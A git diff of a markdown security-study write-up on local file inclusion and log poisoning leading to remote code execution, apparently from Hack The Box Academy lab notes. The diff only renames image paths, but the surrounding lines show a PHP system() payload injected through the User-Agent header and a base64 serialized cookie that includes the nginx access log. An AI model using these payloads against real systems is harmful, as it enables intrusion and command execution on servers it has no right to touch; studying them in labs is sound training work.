@@ -186,7 +186,7 @@ Note: Change the size to 34 for the particular string </p>
 
 ```` O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";} ````
 
-![Alt text](https://github.com/anuvind2973/Web-Application-Security/blob/main/File%20Inclusion/Log%20Poisoning.webp)
+![Alt text](https://github.com/anuvind2973/Web-Application-Security/blob/main/File%20Inclusion/Log%20Poisoning_RCE.webp)
 
 
 ### Remote Code Execution
@@ -199,7 +199,7 @@ Below PHP function system() accepts a command as a parameter and displays its re
 
 ```` <?php system('ls /'); ?> ````
 
-![Alt text](https://github.com/anuvind2973/Web-Application-Security/blob/main/File%20Inclusion/Log%20Poisoning_RCE.webp)
+![Alt text](https://github.com/anuvind2973/Web-Application-Security/blob/main/File%20Inclusion/Images/Log%20Poisoning_RCE.webp)
 
 ````
 Command: curl -i -v {URL} -A "<?php system('ls /'); ?>"
@@ -214,7 +214,7 @@ After the request is sent, the PHP code has been logged into the system and shou
 
 ```` Command:  curl -i -v {URL} -b "PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==" ````
 
-![Alt text](https://github.com/anuvind2973/Web-Application-Security/blob/main/File%20Inclusion/Log%20Poisoning_RCE_.webp)
+![Alt text](https://github.com/anuvind2973/Web-Application-Security/blob/main/File%20Inclusion/Images/Log%20Poisoning_RCE_.webp)
 
 https://academy.hackthebox.com/module/23/section/1492
 https://academy.hackthebox.com/module/23/section/1491
